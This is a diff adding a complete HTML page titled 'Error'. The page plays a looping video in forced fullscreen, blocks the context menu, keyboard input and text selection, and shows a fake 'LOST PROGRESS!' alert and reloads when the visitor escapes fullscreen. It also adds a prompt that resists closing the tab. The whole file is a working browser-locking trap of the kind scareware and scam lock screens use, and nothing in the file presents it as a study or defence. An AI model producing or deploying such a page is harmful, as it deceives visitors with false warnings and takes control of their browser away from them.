@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Error</title>
+<style>
+  body, html { margin:0; padding:0; width:100%; height:100%; background:#111; overflow:hidden; }
+  #video { width:100%; height:100%; object-fit:cover; }
+</style>
+</head>
+<body>
+
+<video id="video" autoplay loop muted>
+  <source src="pump.mp4" type="video/mp4">
+</video>
+
+<script>
+const video = document.getElementById('video');
+
+// Request fullscreen immediately
+function goFullscreen() {
+  document.documentElement.requestFullscreen?.();
+  video.play();
+}
+goFullscreen();
+
+// Prevent right-click, keyboard, and text selection
+document.addEventListener('contextmenu', e => e.preventDefault());
+document.addEventListener('keydown', e => e.preventDefault());
+document.addEventListener('selectstart', e => e.preventDefault());
+
+// Warn on leaving fullscreen
+document.addEventListener('fullscreenchange', () => {
+  if (!document.fullscreenElement) {
+    alert('⚠ LOST PROGRESS!');
+    location.reload();
+    goFullscreen();
+  }
+});
+
+// Prevent accidental tab close
+window.onbeforeunload = () => '⚠ LOST PROGRESS!';
+</script>
+
+</body>
+</html>
